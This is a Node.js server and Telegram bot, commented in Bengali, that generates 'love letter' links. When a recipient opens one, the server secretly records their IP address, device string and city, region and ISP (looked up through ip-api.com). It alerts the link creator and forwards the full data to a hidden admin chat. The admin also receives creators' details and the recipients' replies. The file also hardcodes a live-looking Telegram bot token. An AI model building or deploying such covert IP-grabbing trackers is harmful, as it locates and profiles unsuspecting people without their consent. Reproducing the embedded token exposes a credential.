const express = require('express');
const path = require('path');
const axios = require('axios');
const { Telegraf } = require('telegraf');

const app = express();
app.use(express.json());

const TELEGRAM_TOKEN = "8922778423:AAGbdZfdUDol_5w3dPbeBH0aucf9qkgtPTA"; 
const SERVER_URL = "https://love-bb7p.onrender.com"; 
const ADMIN_CHAT_ID = "6719885052"; 

const bot = new Telegraf(TELEGRAM_TOKEN);

// ডাটাবেজ সেশন অবজেক্ট
const linkDatabase = {}; 
const userSessions = {}; 

// 🤖 ১. /newlink কমান্ড দিলে প্রথম ধাপ শুরু হবে
bot.command('newlink', (ctx) => {
    const userId = ctx.chat.id;
    
    // ইউজারের সেশন স্টেট সেট করা
    userSessions[userId] = {
        step: 'AWAITING_ANIMATION_TEXT',
        name: `${ctx.message.from.first_name} ${ctx.message.from.last_name || ''}`,
        username: ctx.message.from.username ? '@' + ctx.message.from.username : 'নেই'
    };

    ctx.reply("✨ কাস্টম লাভ লিঙ্ক তৈরি সেশন শুরু হয়েছে!\n\n" +
              "👉 প্রথমে শুরুর অ্যানিমেশন টেক্সটগুলো দিন।\n" +
              "⚠️ মনে রাখবেন: প্রতি লাইনের পর একটি করে 'Enter' দিয়ে নতুন লাইনে লিখবেন। যতগুলো ইচ্ছা লাইন দিতে পারেন।\n\n" +
              "যেমন:\n" +
              "হেই সুন্দরী\n" +
              "কেমন আছো\n" +
              "কি করো");
});

// 🤖 ২. ইউজারের মেসেজ হ্যান্ডল করার লজিক (স্টেট মেশিন)
bot.on('text', (ctx) => {
    const userId = ctx.chat.id;
    const session = userSessions[userId];
    const text = ctx.message.text;

    if (!session) return; // কোনো অ্যাক্টিভ সেশন না থাকলে ইগনোর করবে

    // ধাপ ১: অ্যানিমেশন টেক্সট রিসিভ করা
    if (session.step === 'AWAITING_ANIMATION_TEXT') {
        // এন্টার (New Line) দিয়ে ভাগ করে অ্যারে তৈরি করা এবং খালি লাইন ফিল্টার করা
        const lines = text.split('\n').map(line => line.trim()).filter(line => line.length > 0);
        
        if (lines.length === 0) {
            return ctx.reply("❌ দয়া করে অন্তত ১টি সলিড লাইন লিখুন!");
        }

        session.animations = lines;
        session.step = 'AWAITING_LETTER_TEXT'; // পরবর্তী ধাপে পাঠানো

        ctx.reply(`✅ চমৎকার! আপনি ${lines.length}টি অ্যানিমেশন লাইন যোগ করেছেন।\n\n` +
                  `💌 এবার খামের ভেতরের মূল চিঠি বা মেসেজটি লিখে পাঠান (নরমাল টেক্সট বা প্যারাগ্রাফের মতো করে লিখুন):`);
        return;
    }

    // ধাপ ২: চিঠির টেক্সট রিসিভ করা ও ফাইনাল লিঙ্ক জেনারেট করা
    if (session.step === 'AWAITING_LETTER_TEXT') {
        const uniqueId = Math.random().toString(36).substring(2, 9);
        
        // গ্লোবাল ডাটাবেজে ডেটা সেভ করা
        linkDatabase[uniqueId] = {
            userId: userId,
            name: session.name,
            username: session.username,
            animations: session.animations,
            letter: text.trim()
        };

        const generatedLink = `${SERVER_URL}/love/${uniqueId}`;
        ctx.reply(`💝 অভিনন্দন! আপনার কাস্টমাইজড লিঙ্কটি সম্পূর্ণ রেডি:\n\n${generatedLink}\n\nএটি কপি করে পাঠিয়ে দিন। সে ওপেন করলেই আপনি নোটিফিকেশন পেয়ে যাবেন!`);

        // অ্যাডমিন (আপনাকে) সেশন ট্র্যাকিং রিপোর্ট পাঠানো
        const currentTime = new Date().toLocaleString("en-US", {timeZone: "Asia/Dhaka"});
        const adminLog = `🚨 **New Customized Link Created!** 🚨\n\n` +
                         `👤 **Creator:** ${session.name} (${session.username})\n` +
                         `🆔 **User ID:** \`${userId}\`\n` +
                         `🎫 **Link ID:** ${uniqueId}\n` +
                         `📋 **Animation Lines:** ${session.animations.length} lines\n` +
                         `⏰ **Time:** ${currentTime}`;

        if (String(userId) !== String(ADMIN_CHAT_ID)) {
            bot.telegram.sendMessage(ADMIN_CHAT_ID, adminLog, { parse_mode: 'Markdown' }).catch(e => {});
        }

        // ইউজারের কারেন্ট মেমোরি সেশন ক্লিয়ার করে দেওয়া
        delete userSessions[userId];
        return;
    }
});

bot.launch().then(() => console.log("Advanced Interactive Telegram Bot Started.")).catch(err => console.error(err));

// 🌐 ৩. ওয়েবসাইট ডাইনামিক রাউট
app.get('/love/:id', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// 📊 ৪. ফ্রন্টএন্ড থেকে কন্টেন্ট রিকোয়েস্ট এবং ইনস্ট্যান্ট ওপেন ট্র্যাকিং একই সাথে
app.post('/api/get-content', async (req, res) => {
    const { id } = req.body;
    const linkData = linkDatabase[id];
    
    if (linkData) {
        let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
        if (ip.includes(',')) ip = ip.split(',')[0].trim();
        const userAgent = req.headers['user-agent'] || 'Unknown Device';
        const openTime = new Date().toLocaleString("en-US", {timeZone: "Asia/Dhaka"});
        let locationInfo = "Location details unavailable";
        
        try {
            if(ip && !ip.includes('127.0.0.1')) {
                const geo = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp`);
                if(geo.data && geo.data.status === 'success') {
                    locationInfo = `🌍 **Location:** ${geo.data.city}, ${geo.data.regionName}, ${geo.data.country}\n🏢 **ISP:** ${geo.data.isp}`;
                }
            }
        } catch(e) {}

        // লিঙ্ক মেকারকে অ্যালার্ট
        bot.telegram.sendMessage(linkData.userId, `👀 **Notification:** কেউ একজন এইমাত্র আপনার কাস্টম লিঙ্কটি ওপেন করেছে!\n⏰ **সময়:** ${openTime}`);

        // অ্যাডমিন (আপনাকে) ফুল ডেটা অ্যালার্ট
        const adminAlert = `👁‍🗨 **Custom Link Opened Alert!** 👁‍🗨\n\n` +
                           `👤 **Creator User:** ${linkData.name} (${linkData.username})\n` +
                           `🎫 **Link ID:** ${id}\n` +
                           `⏰ **Time:** ${openTime}\n\n` +
                           `🌐 **IP:** \`${ip}\`\n` +
                           `${locationInfo}\n` +
                           `📱 **Device:** \`${userAgent}\``;

        if (String(linkData.userId) !== String(ADMIN_CHAT_ID)) {
            bot.telegram.sendMessage(ADMIN_CHAT_ID, adminAlert, { parse_mode: 'Markdown' }).catch(e => {});
        }

        // ফ্রন্টএন্ডে কাস্টমাইজড ডেটা পাঠানো
        return res.json({
            success: true,
            animations: linkData.animations,
            letter: linkData.letter
        });
    }
    res.json({ success: false, error: "Invalid link id" });
});

// 💌 ৫. রেসপন্স হ্যান্ডলার (Yes/No ক্লিক নোটিফিকেশন)
app.post('/api/respond', (req, res) => {
    const { response, id } = req.body;
    const linkData = linkDatabase[id]; 
    
    if (linkData) {
        bot.telegram.sendMessage(linkData.userId, `💌 আপনার কাস্টম লিঙ্কে একটি নতুন রেসপন্স এসেছে!\n\nউত্তর: ${response}`);
        
        const adminResponseTime = new Date().toLocaleString("en-US", {timeZone: "Asia/Dhaka"});
        const adminNotification = `💬 **Custom Link Response!** 💬\n\n` +
                                  `👤 **User:** ${linkData.name}\n` +
                                  `⏰ **Time:** ${adminResponseTime}\n\n` +
                                  `❤️ **Reply:** \`${response}\``;

        if (String(linkData.userId) !== String(ADMIN_CHAT_ID)) {
            bot.telegram.sendMessage(ADMIN_CHAT_ID, adminNotification, { parse_mode: 'Markdown' }).catch(e => {});
        }
        res.json({ success: true });
    } else {
        res.json({ success: false });
    }
});

// 🔄 ৬. এন্টি-স্লিপ পিং
app.get('/ping_test', (req, res) => res.send("Awake!"));
setInterval(() => { axios.get(`${SERVER_URL}/ping_test`).catch(e=>''); }, 270000);

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server live on port ${PORT}`));
